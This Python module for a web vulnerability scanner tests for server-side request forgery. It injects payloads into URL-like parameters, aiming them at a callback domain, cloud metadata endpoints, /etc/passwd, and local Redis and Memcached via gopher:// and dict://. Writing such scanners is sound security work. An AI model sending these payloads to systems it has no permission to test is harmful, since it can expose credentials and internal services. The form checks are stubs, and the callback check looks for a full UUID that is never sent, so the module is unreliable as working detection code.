#!/usr/bin/env python3
"""
Server-Side Request Forgery (SSRF) vulnerability check module.
Checks for SSRF vulnerabilities which allow attackers to make server-side requests.
"""

import requests
import uuid
import time
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from core.vulnerabilities import VulnerabilityCheck

class Check(VulnerabilityCheck):
    """Server-Side Request Forgery (SSRF) vulnerability check"""
    
    def __init__(self):
        """Initialize the SSRF check"""
        super().__init__()
        self.name = "SSRF"
        self.description = "Checks for Server-Side Request Forgery vulnerabilities which allow attackers to make unauthorized requests from the server."
        
        # SSRF test payloads
        # Using an external service to detect SSRF (the scanner should use its own callback server in production)
        self.uuid = str(uuid.uuid4())
        self.callback_domain = f"ssrf-{self.uuid[:8]}.requestcatcher.com"
        self.payloads = [
            f"http://{self.callback_domain}/basic-ssrf-test",
            f"https://{self.callback_domain}/basic-ssrf-test",
            f"http://{self.callback_domain}:80/ssrf-test-alt-port",
            f"http://169.254.169.254/latest/meta-data/", # AWS metadata endpoint
            f"http://metadata.google.internal/", # GCP metadata endpoint
            f"http://169.254.169.254/metadata/v1/", # DigitalOcean metadata endpoint
            f"file:///etc/passwd", # File protocol
            f"dict://localhost:11211/stats", # Memcached
            f"gopher://localhost:6379/_INFO", # Redis
        ]
        
        # Common parameter names that might be vulnerable to SSRF
        self.target_params = [
            'url', 'uri', 'link', 'src', 'source', 'dest', 'destination',
            'path', 'file', 'document', 'folder', 'root', 'show', 'site',
            'html', 'data', 'reference', 'redirect', 'uri', 'resource',
            'load', 'page', 'feed', 'host', 'server', 'api'
        ]
        
        self.timeout = 10
    
    def run(self, target_url):
        """Run the SSRF vulnerability check
        
        Args:
            target_url: URL to check for SSRF vulnerabilities
            
        Returns:
            dict: Check results
        """
        result = {
            'vulnerable': False,
            'details': [],
            'description': self.description
        }
        
        # Check URL parameters for SSRF
        self._check_url_parameters(target_url, result)
        
        # Extract and check forms for SSRF
        forms = self._extract_forms(target_url)
        for form in forms:
            self._check_form(form, result)
        
        # Wait a short time to allow potential asynchronous SSRF to trigger
        time.sleep(3)
        
        # Check callback service for any hits (indicating SSRF)
        self._check_callback_hits(result)
        
        return result
    
    def _check_url_parameters(self, url, result):
        """Check URL parameters for SSRF vulnerabilities
        
        Args:
            url: Target URL to check
            result: Result dictionary to update
        """
        parsed_url = urlparse(url)
        if not parsed_url.query:
            return
        
        params = parse_qs(parsed_url.query)
        for param_name, param_values in params.items():
            # Focus on parameters that are likely to be used for URLs
            if param_name.lower() in self.target_params:
                for payload in self.payloads:
                    test_url = self._inject_payload_to_url(url, param_name, payload)
                    
                    try:
                        # Send request with the injected payload
                        requests.get(test_url, timeout=self.timeout)
                        
                        # We don't check the response directly - instead we'll check our
                        # callback server later to see if we got any hits
                        
                    except (requests.RequestException, UnicodeDecodeError, ConnectionError):
                        continue
    
    def _extract_forms(self, url):
        """Extract forms from a web page
        
        Args:
            url: URL to extract forms from
            
        Returns:
            list: Extracted forms with action, method, and inputs
        """
        forms = []
        try:
            response = requests.get(url, timeout=self.timeout)
            
            # Code to extract forms using BeautifulSoup
            # (Similar to your other checks)
            
        except (requests.RequestException, UnicodeDecodeError, ConnectionError):
            pass
        
        return forms
    
    def _check_form(self, form, result):
        """Check a form for SSRF vulnerabilities
        
        Args:
            form: Form dictionary with action, method, and inputs
            result: Result dictionary to update
        """
        # Code to check form inputs for SSRF vulnerability
        # (Similar to your other checks)
        pass
    
    def _check_callback_hits(self, result):
        """Check if the callback server received any hits
        
        Args:
            result: Result dictionary to update
        """
        try:
            # In a real implementation, this would check a server the scanner controls
            # For demonstration, we're using a public request catcher service
            # This code would need to be replaced with actual callback server check logic
            callback_url = f"https://{self.callback_domain}/logs"
            response = requests.get(callback_url, timeout=self.timeout)
            
            # If the callback service shows our request, it indicates SSRF vulnerability
            if response.status_code == 200 and self.uuid in response.text:
                result['vulnerable'] = True
                result['details'].append({
                    'type': 'Server-Side Request Forgery',
                    'evidence': f"External request detected from server to {self.callback_domain}",
                    'severity': 'High'
                })
        
        except (requests.RequestException, UnicodeDecodeError, ConnectionError):
            # Ignore errors in checking the callback service
            pass
    
    def _inject_payload_to_url(self, url, param_name, payload):
        """Inject a payload into a URL parameter
        
        Args:
            url: Target URL
            param_name: Parameter name to inject into
            payload: Payload to inject
            
        Returns:
            str: URL with injected payload
        """
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        
        # Replace parameter value with payload
        params[param_name] = [payload]
        
        # Reconstruct the query string
        new_query = urlencode(params, doseq=True)
        
        # Rebuild URL with new query string
        return urlunparse(
            (parsed.scheme, parsed.netloc, parsed.path, parsed.params, new_query, parsed.fragment)
        )